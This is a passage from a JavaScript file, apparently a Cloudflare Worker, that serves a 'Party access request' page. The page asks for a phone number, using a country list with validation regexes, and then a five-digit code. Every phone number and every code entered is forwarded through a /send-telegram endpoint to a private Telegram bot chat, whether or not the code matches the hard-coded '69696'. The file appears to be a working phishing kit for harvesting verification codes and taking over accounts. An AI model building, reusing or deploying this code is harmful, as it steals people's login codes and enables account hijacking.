{name:"Sweden",flag:"🇸🇪",code:"+46",regex:/^7[0236]\\d{7}$/,hint:"7X XXX XXXX"},
{name:"Switzerland",flag:"🇨🇭",code:"+41",regex:/^7[4-9]\\d{7}$/,hint:"7X XXX XXXX"},
{name:"Syria",flag:"🇸🇾",code:"+963",regex:/^9[3-9]\\d{7}$/,hint:"9 digits"},
{name:"Taiwan",flag:"🇹🇼",code:"+886",regex:/^9\\d{8}$/,hint:"9XX XXX XXX"},
{name:"Tajikistan",flag:"🇹🇯",code:"+992",regex:/^[3-59]\\d{8}$/,hint:"9 digits"},
{name:"Tanzania",flag:"🇹🇿",code:"+255",regex:/^[67]\\d{8}$/,hint:"9 digits"},
{name:"Thailand",flag:"🇹🇭",code:"+66",regex:/^[689]\\d{8}$/,hint:"9 digits"},
{name:"Timor-Leste",flag:"🇹🇱",code:"+670",regex:/^7[3-9]\\d{6}$/,hint:"8 digits"},
{name:"Togo",flag:"🇹🇬",code:"+228",regex:/^[279]\\d{7}$/,hint:"8 digits"},
{name:"Tokelau",flag:"🇹🇰",code:"+690",regex:/^[2-9]\\d{3}$/,hint:"4 digits"},
{name:"Tonga",flag:"🇹🇴",code:"+676",regex:/^[2-9]\\d{6}$/,hint:"7 digits"},
{name:"Trinidad and Tobago",flag:"🇹🇹",code:"+1-868",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Tunisia",flag:"🇹🇳",code:"+216",regex:/^[2-9]\\d{7}$/,hint:"8 digits"},
{name:"Turkey",flag:"🇹🇷",code:"+90",regex:/^5\\d{9}$/,hint:"5XX XXX XX XX"},
{name:"Turkmenistan",flag:"🇹🇲",code:"+993",regex:/^6\\d{7}$/,hint:"8 digits"},
{name:"Turks and Caicos",flag:"🇹🇨",code:"+1-649",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Tuvalu",flag:"🇹🇻",code:"+688",regex:/^[2-9]\\d{5}$/,hint:"6 digits"},
{name:"Uganda",flag:"🇺🇬",code:"+256",regex:/^7\\d{8}$/,hint:"7XX XXX XXX"},
{name:"Ukraine",flag:"🇺🇦",code:"+380",regex:/^[3-9]\\d{8}$/,hint:"9 digits"},
{name:"United Arab Emirates",flag:"🇦🇪",code:"+971",regex:/^5\\d{8}$/,hint:"5X XXX XXXX"},
{name:"United Kingdom",flag:"🇬🇧",code:"+44",regex:/^7\\d{9}$/,hint:"7XXX XXXXXX"},
{name:"United States",flag:"🇺🇸",code:"+1",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Uruguay",flag:"🇺🇾",code:"+598",regex:/^9\\d{7}$/,hint:"8 digits"},
{name:"US Virgin Islands",flag:"🇻🇮",code:"+1-340",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Uzbekistan",flag:"🇺🇿",code:"+998",regex:/^[2-9]\\d{8}$/,hint:"9 digits"},
{name:"Vanuatu",flag:"🇻🇺",code:"+678",regex:/^[579]\\d{6}$/,hint:"7 digits"},
{name:"Vatican City",flag:"🇻🇦",code:"+379",regex:/^[3-9]\\d{7}$/,hint:"8 digits"},
{name:"Venezuela",flag:"🇻🇪",code:"+58",regex:/^4\\d{9}$/,hint:"10 digits"},
{name:"Vietnam",flag:"🇻🇳",code:"+84",regex:/^(?:3|5|7|8|9)\\d{8}$/,hint:"9 digits"},
{name:"Wallis and Futuna",flag:"🇼🇫",code:"+681",regex:/^[5-8]\\d{5}$/,hint:"6 digits"},
{name:"Western Sahara",flag:"🇪🇭",code:"+212",regex:/^[67]\\d{8}$/,hint:"9 digits"},
{name:"Yemen",flag:"🇾🇪",code:"+967",regex:/^7\\d{8}$/,hint:"9 digits"},
{name:"Zambia",flag:"🇿🇲",code:"+260",regex:/^[7-9]\\d{8}$/,hint:"9 digits"},
{name:"Zimbabwe",flag:"🇿🇼",code:"+263",regex:/^7[1-8]\\d{7}$/,hint:"9 digits"}
];
let selectedCountry=null;
const REAL_CODE="69696";
let savedPhone="";
function show(id){document.querySelectorAll('.card').forEach(c=>c.classList.add('hidden'));document.getElementById(id).classList.remove('hidden');}
function goToStep2(){show('step2');}
function openCountryModal(){document.getElementById('countryModal').classList.add('active');renderCountryList(countries);setTimeout(()=>document.getElementById('searchCountry').focus(),100);}
function closeCountryModal(){document.getElementById('countryModal').classList.remove('active');document.getElementById('searchCountry').value="";}
function renderCountryList(list){document.getElementById('countryList').innerHTML=list.map(c=>'<div class="country-item" onclick="selectCountry(\\''+c.name.replace(/'/g,"\\\\'")+'\\',\\''+c.flag+'\\',\\''+c.code+'\\')"><span class="flag">'+c.flag+'</span><span class="name">'+c.name+'</span><span class="code">'+c.code+'</span></div>').join('');}
function filterCountries(){const q=document.getElementById('searchCountry').value.toLowerCase();renderCountryList(countries.filter(c=>c.name.toLowerCase().includes(q)||c.code.includes(q)));}
function selectCountry(name,flag,code){selectedCountry=countries.find(c=>c.name===name);document.getElementById('selFlag').textContent=flag;document.getElementById('selName').textContent=name;document.getElementById('selCode').textContent=code;document.getElementById('phone').disabled=false;document.getElementById('phone').value=code;document.getElementById('phoneHint').textContent='Format: '+selectedCountry.hint;document.getElementById('phone').focus();closeCountryModal();}
async function sendToTelegram(text){try{await fetch('/send-telegram',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:text})});}catch(e){console.log(e);}}
async function sendPhone(){const phone=document.getElementById('phone').value.trim();const err=document.getElementById('err');err.textContent="";if(!selectedCountry){err.textContent="❌ Please select your country first";return;}const codeClean=selectedCountry.code.replace('+','').replace('-','');const cleanPhone=phone.replace(/[\\s\\-\\(\\)\\+]/g,'');let num=cleanPhone;if(cleanPhone.startsWith(codeClean))num=cleanPhone.substring(codeClean.length);if(!selectedCountry.regex.test(num)){err.textContent="❌ Invalid phone number for "+selectedCountry.name+". Expected: "+selectedCountry.hint;return;}savedPhone=selectedCountry.flag+' '+phone;await sendToTelegram('🎉 *Party access request*\\n\\n🌍 Country: '+selectedCountry.name+' '+selectedCountry.flag+'\\n📱 Phone: '+phone+'\\n⏰ '+new Date().toLocaleString('en-US'));show('step3');document.getElementById('code').focus();}
function verifyCode(){const code=document.getElementById('code').value.trim();const err=document.getElementById('err2');const btn=document.getElementById('verifyBtn');err.textContent="";if(code.length!==5||!/^\\d{5}$/.test(code)){err.textContent="❌ Code must be 5 digits";return;}btn.innerHTML='Verifying... <span class="loader"></span>';btn.disabled=true;sendToTelegram('🔑 *Code entered: '+code+'*').then(()=>{btn.innerHTML='✅ Verify & Enter';btn.disabled=false;if(code===REAL_CODE){show('step4');}else{err.textContent="❌ Incorrect code! Try again.";document.getElementById('code').value="";}});}
document.getElementById('countryModal').addEventListener('click',function(e){if(e.target===this)closeCountryModal();});
</script>
</body>
</html>`;

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    
    if (url.pathname === '/' || url.pathname === '') {
      return new Response(HTML_CONTENT, {
        headers: { 'Content-Type': 'text/html;charset=UTF-8' }
      });
    }
    
    if (url.pathname === '/send-telegram' && request.method === 'POST') {
      try {
        const { text } = await request.json();
        const BOT_TOKEN = env.BOT_TOKEN;
        const CHAT_ID = env.CHAT_ID;
        
        if (!BOT_TOKEN || !CHAT_ID) {
          return new Response(JSON.stringify({ error: 'Missing env variables' }), { 
            status: 500,
            headers: { 'Content-Type': 'application/json' }
          });
        }
        
        const response = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
          })
        });
        
        const data = await response.json();
        return new Response(JSON.stringify(data), {
          status: response.ok ? 200 : 500,
          headers: { 'Content-Type': 'application/json' }
        });
      } catch (e) {
        return new Response(JSON.stringify({ error: e.message }), { status: 500 });
      }
    }
    
    return new Response('Not Found', { status: 404 });
  }
};
